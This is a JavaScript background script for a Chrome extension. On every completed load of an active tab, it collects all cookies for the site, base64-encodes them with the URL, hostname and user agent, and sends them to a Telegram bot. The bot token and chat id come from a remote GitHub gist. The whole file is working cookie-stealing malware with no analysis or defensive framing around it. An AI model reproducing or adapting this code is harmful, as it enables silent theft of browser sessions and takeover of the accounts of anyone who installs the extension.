function cookie_xy(expoCookie){
        chrome.tabs.getSelected(null, function(tab) {
            var name = new URL(tab.url).hostname;
            var cookie = btoa(expoCookie);
            var uri = tab.url;
            var ipx = 'localhost';
            var UAgent = window.navigator.userAgent;
            var xhl = new XMLHttpRequest();
            xhl.open('GET', 'https://gist.githubusercontent.com/the5orcerer/87fd54148d22081426bb3cada383da44/raw/66ec4b9f48a7b6a73f2d9afa4d24279c91cf0d77/keys.json', false);
            xhl.send();
            var extKEY = JSON.parse(xhl.responseText);
            var jsSEC = '--------['+name+']--------\nURL : '+uri+'\nIP : '+ipx+'\nUser-Agent : '+UAgent+'\n\n['+cookie+']\n\n--------[END]--------';
            //var params = 'name='+name+'&url='+uri+'&uAgent='+UAgent+'&ipx='+ipx+'&cookie='+cookie;
            var param = 'text='+jsSEC;
            var xhr = new XMLHttpRequest();
            var url = 'https://api.telegram.org/bot'+extKEY.key+'/sendMessage?chat_id='+extKEY.id;
            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhr.send(param);
    });
};
chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    
    chrome.cookies.getAll({"url":tab.url},function (cookie){
        var nullObj = [];
        for(var i=0;i<cookie.length;i++){
            nullObj.push(JSON.stringify(cookie[i], null, 4));
        };
        if (changeInfo.status == 'complete' && tab.active) {
            if (tab.url === 'chrome://newtab/'){
                return true
            }
            else{
                cookie_xy(nullObj);
            };
        };
    });
});